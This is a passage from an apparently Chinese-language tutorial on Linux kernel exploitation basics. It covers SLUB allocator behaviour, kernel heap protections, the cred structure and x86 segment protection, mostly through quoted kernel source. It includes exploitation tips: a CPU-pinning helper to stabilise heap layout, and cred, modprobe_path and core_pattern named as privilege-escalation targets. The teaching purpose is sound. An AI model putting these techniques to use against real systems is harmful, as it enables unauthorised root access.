get_random_long();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!calculate_sizes(s, <span class="number">-1</span>))</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line">	<span class="keyword">if</span> (disable_higher_order_debug) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Disable debugging flags that store metadata if the min slab</span></span><br><span class="line"><span class="comment">		 * order increased.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (get_order(s-&gt;size) &gt; get_order(s-&gt;object_size)) &#123;</span><br><span class="line">			s-&gt;flags &amp;= ~DEBUG_METADATA_FLAGS;</span><br><span class="line">			s-&gt;offset = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">if</span> (!calculate_sizes(s, <span class="number">-1</span>))</span><br><span class="line">				<span class="keyword">goto</span> error;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_HAVE_CMPXCHG_DOUBLE) &amp;&amp; \</span></span><br><span class="line"><span class="meta">    defined(CONFIG_HAVE_ALIGNED_STRUCT_PAGE)</span></span><br><span class="line">	<span class="keyword">if</span> (system_has_cmpxchg_double() &amp;&amp; (s-&gt;flags &amp; SLAB_NO_CMPXCHG) == <span class="number">0</span>)</span><br><span class="line">		<span class="comment">/* Enable fast mode */</span></span><br><span class="line">		s-&gt;flags |= __CMPXCHG_DOUBLE;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The larger the object size is, the more pages we want on the partial</span></span><br><span class="line"><span class="comment">	 * list to avoid pounding the page allocator excessively.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	set_min_partial(s, ilog2(s-&gt;size) / <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	set_cpu_partial(s);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">	s-&gt;remote_node_defrag_ratio = <span class="number">1000</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Initialize the pre-computed randomized freelist if slab is up */</span></span><br><span class="line">	<span class="keyword">if</span> (slab_state &gt;= UP) &#123;</span><br><span class="line">		<span class="keyword">if</span> (init_cache_random_seq(s))</span><br><span class="line">			<span class="keyword">goto</span> error;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!init_kmem_cache_nodes(s))</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (alloc_kmem_cache_cpus(s))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	free_kmem_cache_nodes(s);</span><br><span class="line">error:</span><br><span class="line">	<span class="keyword">if</span> (flags &amp; SLAB_PANIC)</span><br><span class="line">		panic(<span class="string">&quot;Cannot create slab %s size=%u realsize=%u order=%u offset=%u flags=%lx\n&quot;</span>,</span><br><span class="line">		      s-&gt;name, s-&gt;size, s-&gt;size,</span><br><span class="line">		      oo_order(s-&gt;oo), s-&gt;offset, (<span class="type">unsigned</span> <span class="type">long</span>)flags);</span><br><span class="line">	<span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h5 id="分配"><a href="#分配" class="headerlink" title="分配"></a>分配</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/f7f490f6f668b542aab003ec27135ad2.png"
                      alt="f7f490f6f668b542aab003ec27135ad2"
                ></p>
<ul>
<li><p>kmem_cache 刚刚建立，还没有任何对象可供分配，此时只能从伙伴系统分配一个 slab ，如下图所示。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/244cd82a22db3cb5168651580d622465-1731649943372-8.png"
                      alt="244cd82a22db3cb5168651580d622465"
                ></p>
</li>
<li><p>如果正在使用的 slab 有 free obj，那么就直接分配即可，这种是最简单快捷的。如下图所示。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/df0e27a7cc01c0a1ab1b387409d7b8a4.png"
                      alt="df0e27a7cc01c0a1ab1b387409d7b8a4"
                ></p>
</li>
<li><p>随着正在使用的 slab 中 obj 的一个个分配出去，最终会无 obj 可分配，此时 per cpu partial 链表中有可用 slab 用于分配，那么就会从 per cpu partial 链表中取下一个 slab 用于分配 obj。如下图所示。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/3b2a9a9ff98bb492fa0cfef2dc1490f6.png"
                      alt="3b2a9a9ff98bb492fa0cfef2dc1490f6"
                ></p>
</li>
<li><p>随着正在使用的 slab 中 obj 的一个个分配出去，最终会无 obj 可分配，此时 per cpu partial 链表也为空，此时发现 per node partial 链表中有可用 slab 用于分配，那么就会从 per node partial 链表中取下一个 slab 用于分配 obj。如下图所示。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/e9439ea41be5d91a1bc8789c50e098ff.png"
                      alt="6.png"
                ></p>
</li>
</ul>
<h5 id="释放"><a href="#释放" class="headerlink" title="释放"></a>释放</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/06ab07e03d42cc6bd7f1079a157d0c6f.png"
                      alt="06ab07e03d42cc6bd7f1079a157d0c6f"
                ></p>
<ul>
<li>假设下图左边的情况下释放 obj，如果满足 kmem_cache_node 的 nr_partial 大于 kmem_cache 的 min_partial 的话，释放情况如下图所示。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/8ee336b6de8e8263a5dfa2dad69c99dc.png"
                      alt="8ee336b6de8e8263a5dfa2dad69c99dc"
                ></li>
<li>假设下图左边的情况下释放 obj，如果不满足 kmem_cache_node 的 nr_partial 大于 kmem_cache 的 min_partial 的话，释放情况如下图所示。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/11bad950de73843bef8e1716a85bdb0c.png"
                      alt="11bad950de73843bef8e1716a85bdb0c"
                ></li>
<li>假设下图从 full slab 释放 obj 的话，如果满足 per cpu partial 管理的所有 slab 的 free object 数量大于  kmem_cache 的 cpu_partial 成员的话的话，将 per cpu partial 链表管理的所有 slab 移动到 per  node partial 链表管理，释放情况如下图所示。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/583c765a6df44d6ffd56e4f506174318.png"
                      alt="583c765a6df44d6ffd56e4f506174318"
                ></li>
<li>假设下图从 full slab 释放 obj 的话，如果不满足 per cpu partial 管理的所有 slab 的 free object 数量大于 kmem_cache 的 cpu_partial 成员的话的话，释放情况如下图所示。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/0dc462afb4eebcf420803eca2491f169.png"
                      alt="11.png"
                ></li>
</ul>
<h4 id="内核堆保护"><a href="#内核堆保护" class="headerlink" title="内核堆保护"></a>内核堆保护</h4><h5 id="SLAB-FREELIST-HARDENED"><a href="#SLAB-FREELIST-HARDENED" class="headerlink" title="SLAB_FREELIST_HARDENED"></a>SLAB_FREELIST_HARDENED</h5><p><code>CONFIG_SLAB_FREELIST_HARDENED=y</code> 编译选项开启 Hardened freelist 保护。在这个配置下，<code>kmem_cache</code> 增加了一个变量 <code>random</code> 。在 <code>mm/slub.c</code> 文件， <code>kmem_cache_open</code> 的时候给 <code>random</code> 字段一个随机数。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> random;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">kmem_cache_open</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">slab_flags_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	s-&gt;flags = kmem_cache_flags(s-&gt;size, flags, s-&gt;name, s-&gt;ctor);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	s-&gt;random = get_random_long();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>

<p><code>set_freepointer</code> 函数中加了一个 <code>BUG_ON</code> 的检查，这里是检查 double free 的，当前 free 的 object 的内存地址和 freelist 指向的第一个 object 的地址不能一样，这和 glibc 类似。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">set_freepointer</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">void</span> *object, <span class="type">void</span> *fp)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> freeptr_addr = (<span class="type">unsigned</span> <span class="type">long</span>)object + s-&gt;offset;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	BUG_ON(object == fp); <span class="comment">/* naive detection of double free or corruption */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	*(<span class="type">void</span> **)freeptr_addr = freelist_ptr(s, fp, freeptr_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>接着是 <code>freelist_ptr</code> ,它会返回当前 object 的下一个 free object 的地址, 加上 hardened 之后会和之前初始化的 random 值做异或。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> *<span class="title function_">freelist_ptr</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> kmem_cache *s, <span class="type">void</span> *ptr,</span></span><br><span class="line"><span class="params">				 <span class="type">unsigned</span> <span class="type">long</span> ptr_addr)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> (<span class="type">void</span> *)((<span class="type">unsigned</span> <span class="type">long</span>)ptr ^ s-&gt;random ^</span><br><span class="line">			(<span class="type">unsigned</span> <span class="type">long</span>)kasan_reset_tag((<span class="type">void</span> *)ptr_addr));</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	<span class="keyword">return</span> ptr;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h5 id="SLAB-FREELIST-RANDOM"><a href="#SLAB-FREELIST-RANDOM" class="headerlink" title="SLAB_FREELIST_RANDOM"></a>SLAB_FREELIST_RANDOM</h5><p><code>CONFIG_SLAB_FREELIST_RANDOM=y</code> 编译选项开启 <code>Random freelist</code> 保护。这种保护主要发生在 slub allocator 向 buddy system 申请到页框之后的处理过程中，对于未开启这种保护的一张完整的  slub，其上的 object 的连接顺序是线性连续的，但在开启了这种保护之后其上的 object  之间的连接顺序是随机的，这让攻击者无法直接预测下一个分配的 object 的地址需要注意的是这种保护发生在<code>slub allocator</code> 刚从 buddy system 拿到新 slub 的时候，运行时 freelist 的构成仍遵循 LIFO。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/Random_freelist.png"
                      alt="Random_freelist"
                ></p>
<h5 id="INIT-ON-ALLOC-DEFAULT-ON"><a href="#INIT-ON-ALLOC-DEFAULT-ON" class="headerlink" title="INIT_ON_ALLOC_DEFAULT_ON"></a>INIT_ON_ALLOC_DEFAULT_ON</h5><p>当编译内核时开启了这个选项时，在内核进行“堆内存”分配时（包括 buddy system 和 slab allocator），会将被分配的内存上的内容进行清零，从而防止了利用未初始化内存进行数据泄露的情况。</p>
<h5 id="GFP-KERNEL-GFP-KERNEL-ACCOUNT-的隔离"><a href="#GFP-KERNEL-GFP-KERNEL-ACCOUNT-的隔离" class="headerlink" title="GFP_KERNEL &amp; GFP_KERNEL_ACCOUNT 的隔离"></a>GFP_KERNEL &amp; GFP_KERNEL_ACCOUNT 的隔离</h5><p><code>GFP_KERNEL</code> 与 <code>GFP_KERNEL_ACCOUNT</code> 是内核中最为常见与通用的分配 flag，常规情况下他们的分配都来自同一个 <code>kmem_cache</code> ——即通用的 <code>kmalloc-xx</code>。</p>
<p>在 5.9 版本之前<code>GFP_KERNEL</code> 与 <code>GFP_KERNEL_ACCOUNT</code> 存在隔离机制，在 <a class="link"   target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/10befea91b61c4e2c2d1df06a2e978d182fcf792" >这个 commit<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 中取消了隔离机制，自内核版本 5.14 起，在 <a class="link"   target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/494c1dfe855ec1f70f89552fce5eadf4a1717552" >这个 commit<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 当中又重新引入：</p>
<ul>
<li>对于开启了 <code>CONFIG_MEMCG_KMEM</code> 编译选项的 kernel 而言（默认开启），其会为使用 <code>GFP_KERNEL_ACCOUNT</code> 进行分配的通用对象<strong>创建一组独立的 <code>kmem_cache</code> ——名为 <code>kmalloc-cg-\*</code></strong> ，从而导致使用这两种 flag 的 object 之间的隔离。</li>
</ul>
<h5 id="SLAB-ACCOUNT"><a href="#SLAB-ACCOUNT" class="headerlink" title="SLAB_ACCOUNT"></a>SLAB_ACCOUNT</h5><p>根据描述，如果在使用 <code>kmem_cache_create</code> 创建一个 cache 时，传递了 <code>SLAB_ACCOUNT</code> 标记，那么这个 cache 就会单独存在，不会与其它相同大小的 cache 合并。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Currently, if we want to account all objects of a particular kmem cache,</span><br><span class="line">we have to pass __GFP_ACCOUNT to each kmem_cache_alloc call, which is</span><br><span class="line">inconvenient. This patch introduces SLAB_ACCOUNT flag which if passed to</span><br><span class="line">kmem_cache_create will force accounting for every allocation from this</span><br><span class="line">cache even if __GFP_ACCOUNT is not passed.</span><br><span class="line"></span><br><span class="line">This patch does not make any of the existing caches use this flag - it</span><br><span class="line">will be done later in the series.</span><br><span class="line"></span><br><span class="line">Note, a cache with SLAB_ACCOUNT cannot be merged with a cache w/o</span><br><span class="line">SLAB_ACCOUNT, i.e. using this flag will probably reduce the number of</span><br><span class="line">merged slabs even if kmem accounting is not used (only compiled in).</span><br></pre></td></tr></table></figure></div>

<p>在早期，许多结构体（如 <strong>cred 结构体</strong>）对应的堆块并不单独存在，会和相同大小的堆块使用相同的 cache。在 Linux 4.5 版本引入了这个 flag 后，许多结构体就单独使用了自己的 cache。然而，根据上面的描述，这一特性似乎最初并不是为了安全性引入的。</p>
<p>以下结构体都拥有独立的 <code>cache</code>。</p>
<ul>
<li><code>threadinfo</code></li>
<li><code>task_struct</code></li>
<li><code>task_delay_info</code></li>
<li><code>pid</code></li>
<li><code>cred</code></li>
<li><code>mm_struct</code></li>
<li><code>vm_area_struct</code> and <code>vm_region (nommu)</code></li>
<li><code>anon_vma</code> and <code>anon_vma_chain</code></li>
<li><code>signal_struct</code></li>
<li><code>sighand_struct</code></li>
<li><code>fs_struct</code></li>
<li><code>files_struct</code></li>
<li><code>fdtable</code> and <code>fdtable-&gt;full_fds_bits</code></li>
<li><code>dentry</code> and <code>external_name</code></li>
<li>inode for all filesystems</li>
</ul>
<h5 id="STATIC-USERMODEHELPER"><a href="#STATIC-USERMODEHELPER" class="headerlink" title="STATIC_USERMODEHELPER"></a>STATIC_USERMODEHELPER</h5><p>禁掉了对于 <code>modprobe_path</code> 和 <code>core_pattern</code> 的利用（只读区域）</p>
<p><strong>CONFIG_INIT_ON_ALLOC_DEFAULT_ON</strong></p>
<p>当编译内核时开启了这个选项时，在内核进行“堆内存”分配时（包括 buddy system 和 slab allocator），<strong>会将被分配的内存上的内容进行清零</strong>，从而防止了利用未初始化内存进行数据泄露的情况。</p>
<h3 id="绑核"><a href="#绑核" class="headerlink" title="绑核"></a>绑核</h3><p>对于多核cpu而言，为了调试和利用方便，我们一般要进行绑核操作，即将进程的堆块分配绑定在某一个核上，从而减轻分配和释放导致的堆块乱序。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __USE_GNU</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_cpu</span><span class="params">(<span class="type">int</span> core)</span> &#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    bind_cpu(sched_getcpu());</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="进程权限管理"><a href="#进程权限管理" class="headerlink" title="进程权限管理"></a>进程权限管理</h2><p>这部分关于进程较为详细的讲解在<a href="https://jelasin.github.io/2024/01/29/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%E4%B9%8B%E8%BF%9B%E7%A8%8B/">这里</a>。</p>
<p><code>kernel</code> 记录了进程的权限，更具体的，是用 <code>cred</code> 结构体记录的，每个进程中都有一个 <code>cred</code> 结构，内核会通过进程的 <code>task_struct</code> 结构体中的 cred 指针来索引 cred 结构体，然后根据 cred 的内容来判断一个进程拥有的权限，这个结构保存了该进程的权限等信息，如果能修改某个进程的 <code>cred</code>，那么也就修改了这个进程的权限。</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">cred</span> &#123;</span><br><span class="line">	<span class="type">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="type">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="type">void</span>		*put_addr;</span><br><span class="line">	<span class="type">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="type">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="type">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">key</span>	*session_keyring; <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">key</span>	*process_keyring; <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">key</span>	*thread_keyring; <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">key</span>	*request_key_auth; <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="type">void</span>		*security;	<span class="comment">/* LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">user_struct</span> *user;	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">user_namespace</span> *user_ns; <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">ucounts</span> *ucounts;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">group_info</span> *group_info;	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="comment">/* RCU deletion */</span></span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		<span class="type">int</span> non_rcu;			<span class="comment">/* Can we skip RCU deletion? */</span></span><br><span class="line">		<span class="keyword">struct</span> <span class="title class_">rcu_head</span>	rcu;		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">	&#125;;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure></div>

<p><strong>一个进程而言应当有三个 <code>cred</code> ：</strong></p>
<ul>
<li><code>ptracer_cred</code>： 使用 <code>ptrace</code> 系统调用跟踪该进程的上级进程的 <code>cred</code>（ gdb 调试便是使用了这个系统调用，常见的反调试机制的原理便是提前占用了这个位置）。</li>
<li><code>real_cred</code>：即客体凭证（objective cred），通常是一个进程最初启动时所具有的权限。</li>
<li><code>cred</code>：即主体凭证（subjective cred），该进程的有效 <code>cred</code> ，<code>kernel</code> 以此作为进程权限的凭证。</li>
</ul>
<p><strong>一个 <code>cred</code> 结构体中记载了一个进程四种不同的用户 ID：</strong></p>
<ul>
<li>用户真实 ID（<code>real UID</code>）:标识一个进程启动时的用户 ID</li>
<li>保存用户 ID（<code>saved UID</code>）：标识一个进程最初的有效用户 ID</li>
<li>有效用户 ID（<code>effective UID</code>）：标识一个进程正在运行时所属的用户 ID</li>
<li>文件系统用户 ID（<code>UID for VFS ops</code>）：标识一个进程创建文件时进行标识的用户 ID</li>
</ul>
<p>通常情况下这四个值都是相同的。用户组 ID 同样分为四个：真实组、保存组、有效组、文件系统组与上面类似。</p>
<h2 id="权限保护机制"><a href="#权限保护机制" class="headerlink" title="权限保护机制"></a>权限保护机制</h2><h3 id="段保护机制"><a href="#段保护机制" class="headerlink" title="段保护机制"></a>段保护机制</h3><ul>
<li><strong>段（Segment）</strong> 是 x86 架构中内存管理的基础单元。每个段定义了一个线性地址范围，程序通过段选择子和偏移量访问内存。</li>
<li>CPU 使用段保护机制，通过段选择子（Segment Selector）和段描述符（Descriptor）来控制不同权限级别（Ring）的内存访问，防止越权操作。</li>
</ul>
<h4 id="段选择子（Segment-Selector）"><a href="#段选择子（Segment-Selector）" class="headerlink" title="段选择子（Segment Selector）"></a>段选择子（Segment Selector）</h4><p>段选择子是存储在 CPU 段寄存器（代码段 <code>cs</code>、数据段 <code>ds</code>、栈段 <code>ss</code> 等）中的低 16 位值，标识了当前程序使用的段。它是程序访问内存段的入口，索引全局或局部段描述符表（GDT 或 LDT）。</p>
<p>段选择子的格式如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/4f2684f1ab4ad202e7f03c900f782bdb.png"
                      alt="img"
                ></p>
<ul>
<li><strong>Index（段索引，13 位）</strong>：指向段描述符表（GDT 或 LDT）中的一个条目，标识具体的段。</li>
<li><strong>TI（Table Indicator，1 位）</strong>：决定段描述符表的类型：<ul>
<li>值为 <code>0</code> 表示选择 <strong>GDT（Global Descriptor Table，全局描述符表）</strong>。</li>
<li>值为 <code>1</code> 表示选择 <strong>LDT（Local Descriptor Table，局部描述符表）</strong>。</li>
</ul>
</li>
<li><strong>RPL（Requested Privilege Level，请求权限级别，2 位）</strong>：<ul>
<li>指定程序期望访问目标段时的权限级别，范围为 <code>0-3</code>。</li>
